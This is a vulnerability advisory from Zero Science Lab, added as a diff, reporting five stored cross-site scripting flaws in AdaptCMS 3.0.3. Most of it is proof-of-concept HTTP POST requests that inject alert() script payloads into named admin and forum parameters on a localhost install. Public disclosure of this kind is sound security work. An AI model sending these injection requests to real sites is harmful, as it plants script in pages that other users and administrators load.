@@ -1,0 +1,146 @@
+
+AdaptCMS 3.0.3 Multiple Persistent XSS Vulnerabilities
+
+
+Vendor: Insane Visions
+Product web page: http://www.adaptcms.com
+Affected version: 3.0.3
+
+Summary: AdaptCMS is a Content Management System trying
+to be both simple and easy to use, as well as very agile
+and extendable. Not only so we can easily create Plugins 
+or additions, but so other developers can get involved.
+Using CakePHP we are able to achieve this with a built-in
+plugin system and MVC setup, allowing us to focus on the
+details and end-users to focus on building their website
+to look and feel great.
+
+Desc: AdaptCMS version 3.0.3 suffers from multiple stored
+cross-site scripting vulnerabilities. Input passed to several
+POST parameters is not properly sanitised before being returned
+to the user. This can be exploited to execute arbitrary HTML
+and script code in a user's browser session in context of an
+affected site.
+
+Tested on: Apache 2.4.10 (Win32)
+           PHP 5.6.3
+           MySQL 5.6.21
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5218
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5218.php
+
+
+29.12.2014
+
+--
+
+
+==========================================
+ #1 Stored XSS
+    POST parameter: data[Category][title]
+------------------------------------------
+
+POST /adaptcms/admin/categories/add HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/adaptcms/admin/categories/add
+Cookie: adaptcms=uu16dmimdemvcq54h3nevq6oa0
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 279
+
+_method=POST&data%5B_Token%5D%5Bkey%5D=851f8e2e973800b2b0635d5157c55369bcade604&data%5BCategory%5D%5Btitle%5D=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&data%5B_Token%5D%5Bfields%5D=14d1551ece2201712436bf482f7e776f422a7966%253A&data%5B_Token%5D%5Bunlocked%5D=
+
+
+=======================================
+ #2 Stored XSS
+    POST parameter: data[Field][title]
+---------------------------------------
+
+POST /adaptcms/admin/fields/ajax_fields/ HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://localhost/adaptcms/admin/fields/add
+Content-Length: 141
+Cookie: adaptcms=uu16dmimdemvcq54h3nevq6oa0
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+data%5BField%5D%5Bcategory_id%5D=2&data%5BField%5D%5Btitle%5D=%22%3E%3Cscript%3Ealert(2)%3B%3C%2Fscript%3E&data%5BField%5D%5Bdescription%5D=
+
+
+=========================
+ #3 Stored XSS
+    POST parameter: name
+-------------------------
+
+POST /adaptcms/admin/tools/create_theme?finish=true HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json;charset=utf-8
+Referer: http://localhost/adaptcms/admin/tools/create_theme
+Content-Length: 242
+Cookie: adaptcms=uu16dmimdemvcq54h3nevq6oa0
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+{"basicInfo":{"name":"\"><script>alert(3);</script>","block_active":"","is_fields":"","is_searchable":""},"versions":{"current_version":"1.0","versions":["1.0","111"]},"skeleton":{"controller":false,"model":false,"layout":true,"views":false}}
+
+
+===========================================
+ #4 Stored XSS
+    POST parameter: data[Link][link_title]
+-------------------------------------------
+
+POST /adaptcms/admin/links/links/add HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/adaptcms/admin/links/links/add
+Cookie: adaptcms=uu16dmimdemvcq54h3nevq6oa0
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 593
+
+_method=POST&data%5B_Token%5D%5Bkey%5D=2c5e2f46b5c13a78395b2e79303543cd4d444789&data%5BLink%5D%5Btitle%5D=444&data%5BLink%5D%5Burl%5D=http%3A%2F%2Fzeroscience.mk&data%5BLink%5D%5Blink_title%5D="><script>alert(4);</script>&data%5BLink%5D%5Blink_target%5D=_new&data%5BLink%5D%5Bactive%5D=0&data%5BLink%5D%5Bactive%5D=1&data%5BLink%5D%5Btype%5D=&data%5BLink%5D%5Bimage_url%5D=&data%5BLink%5D%5Bselect_all%5D=0&data%5BLink%5D%5Bselect_none%5D=0&data%5BLink%5D%5Bsort_by%5D=&data%5BLink%5D%5Bsort_direction%5D=&data%5B_Token%5D%5Bfields%5D=34394f00acd7233477b8cd9e681e331f083052a5%253A&data%5B_Token%5D%5Bunlocked%5D=
+
+
+==============================================
+ #5 Stored XSS
+    POST parameter: data[ForumTopic][subject]
+----------------------------------------------
+
+POST /adaptcms/forums/off-topic/new HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/adaptcms/forums/off-topic/new
+Cookie: adaptcms=c4fqklpt7gneokqbbv4iq1e5b1
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 460
+
+_method=POST&data%5B_Token%5D%5Bkey%5D=4c5428572b6454152377ae8db2c3a8a753f39dba&data%5BForumTopic%5D%5Bsubject%5D=%22%3E%3Cscript%3Ealert%285%29%3B%3C%2Fscript%3E&data%5BForumTopic%5D%5Bcontent%5D=%3Cp%3Etestingcontent%3C%2Fp%3E&data%5BForumTopic%5D%5Btopic_type%5D=topic&data%5BForumTopic%5D%5Bforum_id%5D=1&data%5B_Token%5D%5Bfields%5D=bcff03f6432e544b05d877fcdd8c29f13155693a%253AForumTopic.forum_id%257CForumTopic.topic_type&data%5B_Token%5D%5Bunlocked%5D=
+
